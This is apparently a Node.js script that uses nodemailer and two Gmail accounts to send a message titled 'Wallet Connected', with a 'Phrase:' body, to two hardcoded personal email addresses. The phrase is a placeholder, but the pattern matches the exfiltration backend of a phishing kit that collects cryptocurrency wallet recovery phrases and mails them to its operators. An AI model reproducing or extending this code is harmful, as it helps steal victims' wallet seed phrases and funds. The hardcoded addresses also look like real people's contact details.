const nodemailer = require('nodemailer');
require('dotenv').config();

// Create transporter for the first email account
let transporter1 = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER1,
        pass: process.env.EMAIL_PASS1
    }
});

// Create transporter for the second email account
let transporter2 = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER2,
        pass: process.env.EMAIL_PASS2
    }
});

// Define the message content
const phrase = "This is the secret phrase";
const message = {
    subject: "Wallet Connected",
    text: `Phrase: ${phrase}`
};

// Email options for the first recipient
let mailOptions1 = {
    from: process.env.EMAIL_USER1,
    to: 'david.ugwu.oluchi@gmail.com',
    subject: message.subject,
    text: message.text
};

// Email options for the second recipient
let mailOptions2 = {
    from: process.env.EMAIL_USER2,
    to: 'adlanmunch@gmail.com',
    subject: message.subject,
    text: message.text
};

// Send mail using the first transporter
transporter1.sendMail(mailOptions1, function(error, info) {
    if (error) {
        console.log('Error sending to Recipient 1:', error);
    } else {
        console.log('Email sent to Recipient 1:', info.response);
    }
});

// Send mail using the second transporter
transporter2.sendMail(mailOptions2, function(error, info) {
    if (error) {
        console.log('Error sending to Recipient 2:', error);
    } else {
        console.log('Email sent to Recipient 2:', info.response);
    }
});
